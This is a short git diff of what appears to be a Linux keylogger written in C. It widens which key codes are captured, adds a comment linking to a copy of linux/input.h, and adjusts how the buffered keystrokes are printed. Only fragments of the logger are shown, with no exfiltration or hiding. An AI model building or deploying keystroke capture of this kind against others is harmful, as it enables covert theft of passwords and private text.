@@ -94,7 +94,11 @@ int interpretCharacter(char* outputBuffer, struct input_event *eventInput, int *
 			}
 			return 0;
 		default:
-			if (eventInput->code >= KEY_1 && eventInput->code <= KEY_SLASH) {
+			if (eventInput->code >= KEY_1 && eventInput->code <= KEY_SPACE) {
+				// For those of you at home, the linux/input.h can be read at:
+					// https://sites.uclouvain.be/SystInfo/usr/include/linux/input.h.html
+					// This is a random site I look at, open at your own risk.
+
 				// Determine if we should convert the character to uppercase
 					// Shift and caps cancel out
 					// We only want characters a-z to be uppercased
@@ -159,7 +163,6 @@ char* inputBuffer(int argc, char **argv, char *eventName, int *temporaryBufferCo
 					break;
 				case -1:
 					// End
-					printf("%s", outputBuffer);
 					return outputBuffer;
 			}
                 }
@@ -223,7 +226,7 @@ int main(int argc, char **argv) {
 
 	while (1) {
 		keylogBuffer = keylogBufferRecieve(argc, argv, result);
-		printf("Ten Line Buffer: {%s}\n", keylogBuffer);
+		printf("Ten Line Buffer: {\n%s}\n", keylogBuffer);
 
 		// Memory management
 		free(keylogBuffer);
